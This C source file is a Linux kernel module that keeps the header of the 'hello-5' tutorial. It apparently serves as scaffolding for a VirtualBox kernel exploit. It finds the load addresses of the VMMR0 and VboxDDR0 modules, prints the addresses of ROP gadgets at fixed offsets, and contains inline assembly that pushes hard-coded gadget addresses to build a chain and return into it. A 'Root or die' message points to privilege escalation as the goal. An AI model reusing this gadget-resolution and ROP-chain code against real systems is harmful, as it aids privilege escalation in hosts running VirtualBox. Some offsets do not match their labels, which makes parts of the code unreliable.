/*
 *  hello-5.c - Demonstrates command line argument passing to a module.
 */
#include <linux/module.h>
#include <linux/moduleparam.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/stat.h>

#include "helper.c"

static void *VMMR0 = NULL;
static void *VboxDDR0 = NULL;
// static void *VboxDD2R0 = 0xffffffffa0066020U;

/*
0 # rdi
0 # rbp
poppopret = VboxDDR0 + 0xdba # pop rdi; pop rbp; ret
0x69 # rdx
popret = VMMR0 + 0x1f7bd # pop rax; ret
*/

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Peter Jay Salzman");

void setup_stack(void) {
	asm (
	"push $0xffffffffa09558d8;"// xor eax, eax; ret
	// "push $0x;"// int $0x80; ret
	"push $0x69;"
	"push $0xffffffffa09747dd;"// pop rax; ret
	"push $0x0;"
	"push $0xffffffffa09d064a;"// pop rdi; ret
	"ret;"
	);
}

static int __init hello_5_init(void) {
    int error;
    VMMR0 = find_addr("VMMR0", &error);
    if (error || VMMR0 == NULL) {
      return 1;
    }
    VboxDDR0 = find_addr("VboxDDR0", &error);
    if (error || VboxDDR0 == NULL) {
      return 1;
    }
	printk(KERN_INFO "VMMR0: %p\n", VMMR0);
	printk(KERN_INFO "VboxDDR0: %p\n", VboxDDR0);
	printk(KERN_INFO "pop rdi; pop rbp; ret: %p: %p\n", VboxDDR0 + 0xdbaU, *(int *)(VboxDDR0 + 0xdbaU));
	printk(KERN_INFO "pop rdi; ret: %p: %p\n", VMMR0 + 0x7b62aU, *(int *)(VMMR0 + 0x7b62aU));
	printk(KERN_INFO "pop rax; ret: %p: %p\n", VMMR0 + 0x1f7bdU, *(int *)(VMMR0 + 0x1f7bdU));
	printk(KERN_INFO "syscall; ret: %p: %p\n", VMMR0 + 0x012c3c0U, *(int *)(VMMR0 + 0x1f85cU));
	printk(KERN_INFO "push rsp; ret: %p: %p\n", VMMR0 + 0x1f7adU, *(int *)(VMMR0 + 0x1f7adU));
	printk(KERN_INFO "pop rbp; ret: %p: %p\n", VMMR0 + 0x28dU, *(int *)(VMMR0 + 0x28dU));
	printk(KERN_INFO "xor eax,eax; ret: %p: %p\n", VMMR0 + 0x8b8U, *(int *)(VMMR0 + 0x8b8U));

	printk(KERN_INFO "Root or die\n");
	// setup_stack();
	printk(KERN_INFO "Success\n");
	return 0;
}

static void __exit hello_5_exit(void)
{
	printk(KERN_INFO "Goodbye, world\n");
}

module_init(hello_5_init);
module_exit(hello_5_exit);
